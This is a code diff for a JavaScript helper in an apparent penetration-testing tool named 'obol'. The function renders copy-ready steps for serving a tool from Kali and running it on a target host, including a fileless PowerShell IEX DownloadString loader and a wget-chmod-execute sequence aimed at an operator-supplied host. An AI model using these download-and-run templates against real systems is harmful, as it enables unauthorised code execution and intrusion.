@@ -67,10 +67,19 @@
     return null;
   }
 
-  // Render the serve -> fetch -> load steps as a copy-ready block. params supplies {{lhost}}.
+  function _arsenal() { try { return JSON.parse(localStorage.getItem('obol.arsenal-profile') || 'null'); } catch (e) { return null; } }
+
+  // Render the serve -> fetch -> load steps as a copy-ready block. params supplies {{lhost}} and (once the
+  // operator has synced Loadout) the real web-serve dir + whether the file is already staged there, so obol
+  // tells them to serve what they have instead of guessing a path.
   function renderToolStaging(r, params) {
     if (!r) return '';
-    var lhost = (params && params.lhost) || '{{lhost}}';
+    params = params || {};
+    var lhost = params.lhost || '{{lhost}}';
+    var prof = params.arsenal || _arsenal();
+    var www = prof && prof.wwwdir;
+    var staged = !!(prof && prof.staged && prof.staged.indexOf(r.file) >= 0);
+    var serveDir = staged ? www : (www || r.where);
     var esc = (OBOL.util && OBOL.util.esc) ? OBOL.util.esc : function (s) { return String(s == null ? '' : s); };
     var attr = (OBOL.util && OBOL.util.attr) ? OBOL.util.attr : esc;
     function step(label, where, cmd) {
@@ -79,7 +88,7 @@
         + '<div class="ns-stage-cmd"><code>' + esc(cmd) + '</code>'
         + '<button class="btn-copy ns-stage-copy" data-copy="' + attr(cmd) + '" title="Copy" aria-label="Copy command">' + (OBOL.ic ? OBOL.ic('clip') : 'copy') + '</button></div></div>';
     }
-    var serve = 'cd "' + (r.where || '.') + '"; python3 -m http.server 80';
+    var serve = 'cd "' + (serveDir || r.where || '.') + '"; python3 -m http.server 80';
     var fetch, load = '';
     if (r.mode === 'ps-iex') {
       fetch = "IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + "/" + r.file + "')";
@@ -93,8 +102,9 @@
       fetch = 'wget http://' + lhost + '/' + r.file + ' -O /tmp/' + r.file + ' && chmod +x /tmp/' + r.file;
       load = '/tmp/' + (r.run ? r.run.replace(/^\.\//, '') : r.file);
     }
+    var why = staged ? ('obol sees ' + r.file + ' already staged in your web dir, so just serve it.') : r.why;
     var html = '<div class="ns-stage"><div class="ns-stage-h">' + (OBOL.ic ? OBOL.ic('box') : '') + ' Get ' + esc(r.name) + ' onto the host</div>'
-      + (r.why ? '<p class="ns-stage-why">' + esc(r.why) + '</p>' : '')
+      + (why ? '<p class="ns-stage-why">' + esc(why) + '</p>' : '')
       + step('Serve it from Kali', 'Kali', serve)
       + step(r.mode === 'ps-iex' ? 'Load it into your session (no file on disk)' : 'Download it on the target', r.os === 'linux' ? 'Target' : 'Target', fetch);
     if (load) html += step(r.mode === 'exe' || r.mode === 'sh' ? 'Run it' : 'Load it', 'Target', load);
